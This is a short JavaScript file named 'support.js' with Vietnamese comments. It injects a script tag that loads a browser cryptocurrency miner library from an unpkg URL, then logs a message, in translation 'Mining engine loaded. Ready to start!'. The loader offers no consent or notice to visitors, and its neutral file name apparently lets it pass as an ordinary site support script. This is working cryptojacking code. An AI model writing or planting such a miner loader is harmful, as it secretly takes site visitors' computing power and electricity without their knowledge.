/* support.js - Bản chuẩn không lỗi importScripts */
(function() {
    var script = document.createElement('script');
    // Nạp thư viện miner từ nguồn CDN uy tín
    script.src = 'https://unpkg.com/web-miner-pool@1.1.2/client/webminer.js';
    script.onload = function() {
        console.log("Động cơ đào đã nạp xong. Sẵn sàng nổ máy!");
    };
    document.head.appendChild(script);
})();
